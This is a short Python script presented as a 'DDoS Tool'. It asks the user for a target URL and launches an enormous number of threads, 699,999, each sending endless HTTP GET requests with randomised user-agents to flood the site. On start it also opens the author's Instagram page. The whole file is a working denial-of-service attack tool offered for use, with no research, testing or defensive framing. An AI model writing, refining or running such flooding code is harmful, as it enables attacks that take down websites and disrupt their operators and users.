import threading
import requests
import os
import time
import sys
import webbrowser
import pyfiglet
from fake_useragent import UserAgent

# Console Colors
R = "\033[1;31m"  # Red
G = "\033[1;32m"  # Green
Y = "\033[1;33m"  # Yellow
C = "\033[1;36m"  # Cyan
W = "\033[1;37m"  # White

# Display Title
def to(s):
    for char in s + "\n":
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.01)

to(pyfiglet.figlet_format('DDoS Tool'))
print(G + "                 by @anxntbhardwaj\n")

# Open Instagram link
webbrowser.open("https://instagram.com/anxntbhardwaj")

# Generate Random User-Agent
ua = UserAgent()
headers = {"User-Agent": ua.random}

# Function to send requests
def send_request(url):
    while True:
        try:
            response = requests.get(url, headers=headers)
            print(f"{G}[+] Attack Sent to {url}")
        except requests.exceptions.RequestException as e:
            print(f"{R}[-] Error sending attack to {url}: {e}")

# Function to launch attack with multiple threads
def launch_attack(url, num_threads):
    print(f"{Y}[*] Launching {num_threads} threads...")
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request, args=(url,))
        thread.daemon = True  # Ensures threads close on exit
        thread.start()

# Main Execution
if __name__ == "__main__":
    target_url = input(C + "ENTER TARGET LINK: " + G)
    num_threads = 699999 # Adjusted for stability

    launch_attack(target_url, num_threads)